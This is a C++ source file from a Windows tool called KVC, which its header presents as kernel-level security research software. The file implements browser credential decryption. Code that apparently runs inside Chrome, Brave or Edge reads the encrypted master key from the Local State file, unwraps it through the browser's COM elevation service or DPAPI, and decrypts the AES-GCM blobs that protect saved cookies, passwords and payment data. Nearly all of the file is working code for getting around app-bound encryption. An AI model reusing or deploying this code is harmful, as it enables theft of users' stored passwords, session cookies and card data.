/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// BrowserCrypto.cpp - Browser-specific cryptographic operations
// Implements selective COM/DPAPI strategy based on browser and data type
#include "BrowserCrypto.h"
#include "CommunicationModule.h"
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <algorithm>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace SecurityComponents
{
    namespace Browser
    {
        // Browser-specific configuration database
        // Contains COM CLSIDs, IIDs, and file paths for each supported browser
        const std::unordered_map<std::string, Config>& GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", 
                    {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, 
                    {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, 
                    fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", 
                    {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, 
                    {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, 
                    fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", 
                    {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, 
                    {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, 
                    fs::path("Microsoft") / "Edge" / "User Data"}}
            };
            return browser_configs;
        }

        // Determines browser configuration based on current process executable name
        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto& configs = GetConfigs();
            if (processName == "chrome.exe") return configs.at("chrome");
            if (processName == "brave.exe")  return configs.at("brave");
            if (processName == "msedge.exe") return configs.at("edge");

            throw std::runtime_error("Unsupported host process: " + processName);
        }
    }

    namespace Crypto
    {
        // Encryption scheme identifier prefixes
        const uint8_t CHROME_KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        const uint8_t EDGE_KEY_PREFIX[] = {'D', 'P', 'A', 'P', 'I'};
        const std::string V10_PREFIX = "v10";
        const std::string V20_PREFIX = "v20";

        // RAII wrapper for BCrypt algorithm handle
        class BCryptAlgorithm
        {
        public:
            BCryptAlgorithm() { 
                BCryptOpenAlgorithmProvider(&handle, BCRYPT_AES_ALGORITHM, nullptr, 0); 
            }
            ~BCryptAlgorithm() { 
                if (handle) BCryptCloseAlgorithmProvider(handle, 0); 
            }
            operator BCRYPT_ALG_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
            
        private:
            BCRYPT_ALG_HANDLE handle = nullptr;
        };

        // RAII wrapper for BCrypt key handle
        class BCryptKey
        {
        public:
            BCryptKey(BCRYPT_ALG_HANDLE alg, const std::vector<uint8_t>& key)
            {
                BCryptGenerateSymmetricKey(alg, &handle, nullptr, 0, 
                                         const_cast<PUCHAR>(key.data()), 
                                         static_cast<ULONG>(key.size()), 0);
            }
            ~BCryptKey() { 
                if (handle) BCryptDestroyKey(handle); 
            }
            operator BCRYPT_KEY_HANDLE() const { return handle; }
            bool IsValid() const { return handle != nullptr; }
            
        private:
            BCRYPT_KEY_HANDLE handle = nullptr;
        };
        
        // Decrypts AES-GCM encrypted data using provided key
        // Supports both v10 and v20 encryption schemes
        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& blob)
        {
            std::string detectedPrefix;
            size_t prefixLength = 0;
            
            // Detect encryption scheme version
            if (blob.size() >= 3)
            {
                if (memcmp(blob.data(), V10_PREFIX.c_str(), V10_PREFIX.length()) == 0)
                {
                    detectedPrefix = V10_PREFIX;
                    prefixLength = V10_PREFIX.length();
                }
                else if (memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) == 0)
                {
                    detectedPrefix = V20_PREFIX;  
                    prefixLength = V20_PREFIX.length();
                }
                else
                {
                    return {};
                }
            }
            else
            {
                return {};
            }

            // Validate blob size
            const size_t GCM_OVERHEAD_LENGTH = prefixLength + GCM_IV_LENGTH + GCM_TAG_LENGTH;
            if (blob.size() < GCM_OVERHEAD_LENGTH)
                return {};

            // Initialize AES-GCM decryption
            BCryptAlgorithm algorithm;
            if (!algorithm.IsValid())
                return {};

            BCryptSetProperty(algorithm, BCRYPT_CHAINING_MODE, 
                            reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)), 
                            sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCryptKey cryptoKey(algorithm, key);
            if (!cryptoKey.IsValid())
                return {};

            // Extract IV, ciphertext, and authentication tag
            const uint8_t* iv = blob.data() + prefixLength;
            const uint8_t* ct = iv + GCM_IV_LENGTH;
            const uint8_t* tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - prefixLength - GCM_IV_LENGTH - GCM_TAG_LENGTH);
            
            // Configure authenticated cipher mode
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = const_cast<PUCHAR>(iv);
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = const_cast<PUCHAR>(tag);
            authInfo.cbTag = GCM_TAG_LENGTH;
            
            // Perform decryption
            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            
            NTSTATUS status = BCryptDecrypt(cryptoKey, const_cast<PUCHAR>(ct), ct_len, &authInfo, 
                                          nullptr, 0, plain.data(), static_cast<ULONG>(plain.size()), 
                                          &outLen, 0);
            if (!NT_SUCCESS(status))
                return {};

            plain.resize(outLen);
            return plain;
        }
        
        // Extracts encrypted master key from browser's Local State file
        // Handles both APPB (COM) and DPAPI blob formats
        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path& localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            
            // Search for encrypted key in JSON
            std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            
            if (pos == std::string::npos) {
                tag = "\"encrypted_key\":\"";
                pos = content.find(tag);
                if (pos == std::string::npos)
                    throw std::runtime_error("Encrypted key not found in Local State.");
            }

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed encrypted key format.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of encrypted key failed.");

            auto& decodedData = *optDecoded;
            
            // Check for APPB prefix (COM-encrypted key)
            if (decodedData.size() >= sizeof(CHROME_KEY_PREFIX) && 
                memcmp(decodedData.data(), CHROME_KEY_PREFIX, sizeof(CHROME_KEY_PREFIX)) == 0)
            {
                return {decodedData.begin() + sizeof(CHROME_KEY_PREFIX), decodedData.end()};
            }
            // Check for DPAPI blob header (0x01000000)
            else if (decodedData.size() >= 4 && 
                     decodedData[0] == 0x01 && decodedData[1] == 0x00 && 
                     decodedData[2] == 0x00 && decodedData[3] == 0x00)
            {
                return decodedData;
            }
            else
            {
                throw std::runtime_error("Unknown key format - not APPB or DPAPI blob.");
            }
        }
    }

    BrowserManager::BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

    fs::path BrowserManager::getUserDataRoot() const
    {
        return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
    }

    MasterKeyDecryptor::MasterKeyDecryptor(PipeLogger& logger) : m_logger(logger) {}

    MasterKeyDecryptor::~MasterKeyDecryptor()
    {
        if (m_comInitialized)
        {
            CoUninitialize();
        }
    }
    
    // Decrypts master key using browser's COM elevation service
    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithCOM(const Browser::Config& config, 
                                                            const std::vector<uint8_t>& encryptedKeyBlob)
    {
        BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char*>(encryptedKeyBlob.data()), 
                                              static_cast<UINT>(encryptedKeyBlob.size()));
        if (!bstrEncKey)
            throw std::runtime_error("Failed to allocate BSTR for encrypted key.");

        BSTR bstrPlainKey = nullptr;
        HRESULT hr = E_FAIL;
        DWORD comErr = 0;

        // Edge uses different COM interface than Chrome/Brave
        if (config.name == "Edge")
        {
            Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
            if (SUCCEEDED(hr))
            {
                CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
                                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
                                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
        }
        else
        {
            Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
            hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
            if (SUCCEEDED(hr))
            {
                CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
                                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
                                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
        }

        SysFreeString(bstrEncKey);
        
        // Validate decryption result
        if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
        {
            if (bstrPlainKey) SysFreeString(bstrPlainKey);
            std::ostringstream oss;
            oss << "COM elevation decryption failed for " << config.name << ". HRESULT: 0x" 
                << std::hex << hr;
            throw std::runtime_error(oss.str());
        }

        std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
        memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
        SysFreeString(bstrPlainKey);
        
        return aesKey;
    }

    // Decrypts master key using Windows DPAPI
    // Used for Edge passwords when orchestrator provides pre-decrypted key
    std::vector<uint8_t> MasterKeyDecryptor::DecryptWithDPAPI(const fs::path& localStatePath)
    {
        auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

        DATA_BLOB inputBlob = {
            static_cast<DWORD>(encryptedKeyBlob.size()),
            encryptedKeyBlob.data()
        };
        DATA_BLOB outputBlob = {};
        
        BOOL result = CryptUnprotectData(&inputBlob, nullptr, nullptr, nullptr, nullptr, 
                                        CRYPTPROTECT_UI_FORBIDDEN, &outputBlob);
        
        if (!result)
        {
            DWORD error = GetLastError();
            std::ostringstream oss;
            oss << "DPAPI decryption failed. Error: 0x" << std::hex << error;
            m_logger.Log("[-] " + oss.str());
            throw std::runtime_error(oss.str());
        }
        
        std::vector<uint8_t> aesKey(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
        LocalFree(outputBlob.pbData);
        
        if (aesKey.size() != Crypto::KEY_SIZE)
        {
            std::string errMsg = "Decrypted key size mismatch: " + std::to_string(aesKey.size()) + 
                               ", expected: " + std::to_string(Crypto::KEY_SIZE);
            m_logger.Log("[-] " + errMsg);
            throw std::runtime_error(errMsg);
        }
        
        return aesKey;
    }

    // Main decryption entry point - selects strategy based on browser and data type
    std::vector<uint8_t> MasterKeyDecryptor::Decrypt(const Browser::Config& config, 
                                                      const fs::path& localStatePath, 
                                                      DataType dataType)
    {
        m_logger.Log("[*] Reading Local State file: " + StringUtils::path_to_string(localStatePath));
        
        // Edge passwords use DPAPI without process requirement
        if (config.name == "Edge" && dataType == DataType::Passwords)
        {
            m_logger.Log("[*] Using DPAPI decryption for Edge passwords (no process required)");
            auto aesKey = DecryptWithDPAPI(localStatePath);
            m_logger.Log("[+] Edge DPAPI decryption successful for passwords");
            return aesKey;
        }
        else
        {
            // All other scenarios use COM elevation
            std::string dataTypeStr = "data";
            switch (dataType) {
                case DataType::Cookies: dataTypeStr = "cookies"; break;
                case DataType::Payments: dataTypeStr = "payments"; break;
                case DataType::Passwords: dataTypeStr = "passwords"; break;
                default: dataTypeStr = "data"; break;
            }
            
            m_logger.Log("[*] Using COM elevation for " + config.name + " " + dataTypeStr);
            
            if (!m_comInitialized)
            {
                if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
                {
                    throw std::runtime_error("Failed to initialize COM library.");
                }
                m_comInitialized = true;
                m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
            }

            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
            
            auto aesKey = DecryptWithCOM(config, encryptedKeyBlob);
            m_logger.Log("[+] " + config.name + " COM elevation decryption successful for " + dataTypeStr);
            return aesKey;
        }
    }
}